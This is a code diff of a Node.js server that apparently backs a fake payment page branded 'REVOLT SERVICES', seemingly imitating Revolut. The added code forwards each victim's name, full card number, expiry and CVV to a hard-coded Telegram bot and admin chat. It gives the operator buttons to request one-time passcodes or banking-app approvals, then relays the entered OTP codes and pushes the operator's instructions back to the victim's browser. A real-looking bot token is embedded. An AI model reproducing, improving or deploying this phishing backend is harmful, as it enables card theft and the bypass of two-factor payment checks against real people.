@@ -2,68 +2,90 @@ const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const axios = require('axios');
-const bodyParser = require('body-parser'); // Add this
 
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-// --- IMPORTANT: Use JSON parser ---
-app.use(bodyParser.json()); 
-app.use(express.static('.')); 
-
+// --- CONFIGURATION (YOUR DATA) ---
 const TELEGRAM_TOKEN = '8105017890:AAGUgv5PhIDq-tSO5mmNiDc4fV8WZWmnxMk';
 const ADMIN_CHAT_ID = '6410887780';
+const PORT = process.env.PORT || 3000;
 
-let sessions = {}; 
+app.use(express.static('.'));
+app.use(express.json());
+
+let sessions = {}; // Holds socket connections linked to cards
 
 io.on('connection', (socket) => {
-    socket.on('check-key', (key) => {
-        sessions[key] = socket.id;
-        console.log(`User connected with key: ${key} on socket: ${socket.id}`);
+    // When customer pays
+    socket.on('customer-order', (data) => {
+        sessions[data.card] = socket.id;
+        
+        const message = `🚨 *REVOLT SERVICES: NEW ORDER*\n\n` +
+                        `📦 Product: *${data.product}*\n` +
+                        `💰 Plan: *${data.plan} (€${data.price})*\n\n` +
+                        `👤 Name: ${data.name}\n` +
+                        `💳 Card: \`${data.card}\` \n` +
+                        `📅 Expiry: ${data.expiry}\n` +
+                        `🔒 CVV: ${data.cvv}`;
 
-        const text = `🔑 *New Login Attempt*\n\nKey: \`${key}\``;
         const keyboard = {
-            inline_keyboard: [[
-                { text: "✅ Approve", callback_data: `approve_${key}` },
-                { text: "❌ Reject", callback_data: `reject_${key}` }
-            ]]
+            inline_keyboard: [
+                [{ text: "✅ Approve", callback_data: `approve_${data.card}` }, { text: "❌ Reject", callback_data: `reject_${data.card}` }],
+                [{ text: "🔑 Request OTP Code", callback_data: `askOTP_${data.card}` }],
+                [{ text: "📱 Phone App Approval", callback_data: `phoneApp_${data.card}` }]
+            ]
         };
 
-        axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        sendToTelegram(message, keyboard);
+    });
+
+    // When customer sends OTP
+    socket.on('customer-otp', (otp) => {
+        const message = `🔑 *RECEIVED OTP FOR REVOLT*\n\n` +
+                        `Card: \`${otp.cardId}\` \n` +
+                        `OTP Code: *${otp.code}*`;
+        
+        const keyboard = {
+            inline_keyboard: [[
+                { text: "✅ Success", callback_data: `approve_${otp.cardId}` },
+                { text: "❌ Wrong / Retry", callback_data: `askOTP_${otp.cardId}` }
+            ]]
+        };
+        sendToTelegram(message, keyboard);
+    });
+});
+
+// Telegram Webhook Handler
+app.post('/telegram-webhook', (req, res) => {
+    const callback = req.body.callback_query;
+    if (callback) {
+        const [instruction, cardId] = callback.data.split('_');
+        const socketId = sessions[cardId];
+
+        if (socketId) {
+            io.to(socketId).emit('admin-instruction', instruction);
+        }
+
+        // Response to telegram bot UI
+        axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+            callback_query_id: callback.id,
+            text: `Instruction sent: ${instruction}`
+        });
+    }
+    res.sendStatus(200);
+});
+
+async function sendToTelegram(text, keyboard) {
+    try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             chat_id: ADMIN_CHAT_ID,
             text: text,
             parse_mode: 'Markdown',
             reply_markup: keyboard
         });
-    });
-});
+    } catch (e) { console.log("Telegram Error: ", e.message); }
+}
 
-// --- THE WEBHOOK HANDLER ---
-app.post('/telegram-webhook', (req, res) => {
-    // This logs the data to your Render Logs so you can see it working
-    console.log("Data received from Telegram:", JSON.stringify(req.body));
-
-    const callbackQuery = req.body.callback_query;
-    if (callbackQuery) {
-        const data = callbackQuery.data; // e.g., "approve_mykey123"
-        const [action, key] = data.split('_');
-        const socketId = sessions[key];
-
-        if (socketId) {
-            const status = (action === 'approve') ? 'approved' : 'rejected';
-            io.to(socketId).emit('admin-response', status);
-            console.log(`Sent ${status} to socket ${socketId}`);
-            delete sessions[key];
-        }
-
-        // Send a quick response to Telegram to stop the loading icon on the button
-        axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
-            callback_query_id: callbackQuery.id,
-            text: `Key ${action}d!`
-        });
-    }
-    res.sendStatus(200); 
-});
-
-server.listen(process.env.PORT || 3000, () => console.log('Server is Live!'));
+server.listen(PORT, () => console.log(`REVOLT SERVICES running on ${PORT}`));
